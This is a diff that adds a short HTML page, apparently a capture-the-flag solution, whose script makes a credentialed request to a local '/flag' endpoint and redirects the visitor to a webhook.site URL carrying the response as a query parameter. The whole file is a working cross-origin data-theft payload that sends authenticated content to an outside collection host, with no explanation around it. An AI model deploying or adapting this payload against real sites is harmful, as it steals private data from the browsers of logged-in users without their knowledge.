@@ -1,0 +1,16 @@
+<html>
+
+<script type="text/javascript">
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+      document.location.replace('https://webhook.site/294f7a9e-0e1e-41d4-9421-bb4adf768cf4?data='+xhr.response);
+    }
+   };
+   xhr.open('GET', 'http://localhost:5000/flag',true);
+   xhr.withCredentials = true;
+   xhr.send(null);
+</script>
+
+</html>
+
